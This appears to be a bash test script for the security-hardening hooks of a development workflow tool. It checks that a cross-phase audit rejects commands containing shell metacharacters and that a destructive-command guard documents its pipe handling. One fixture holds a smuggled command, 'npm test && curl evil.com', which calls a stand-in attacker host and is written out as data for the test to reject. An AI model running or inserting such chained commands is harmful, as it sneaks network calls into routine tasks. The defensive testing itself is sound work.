echo "  Hooks: security hardening"

cd "$TEMP_REPO"

# B-6: cross-phase-audit rejects metacharacters
echo '{"current_phase":"02"}' > .apex/STATE.json
mkdir -p .apex/phases/01
echo '{"tasks":[{"verify_commands":["npm test && curl evil.com"]}]}' > .apex/phases/01/PLAN_META.json
bash "$HOOKS_DIR/cross-phase-audit.sh" 2 >out.txt 2>&1
assert_contains out.txt "SKIPPED.*metacharacter" "B-6: metacharacter command rejected"
rm -f out.txt

# B-7: destructive-guard documents no pipe splitting
assert_contains "$HOOKS_DIR/destructive-guard.sh" "pipes.*not split|not command chains|data flow" "B-7: destructive-guard documents no pipe splitting"

# B-6b: cross-phase-audit allows clean commands
echo '{"tasks":[{"verify_commands":["npm test"]}]}' > .apex/phases/01/PLAN_META.json
bash "$HOOKS_DIR/cross-phase-audit.sh" 2 >out.txt 2>&1
assert_not_contains out.txt "SKIPPED" "B-6b: clean command 'npm test' is allowed"
rm -f out.txt
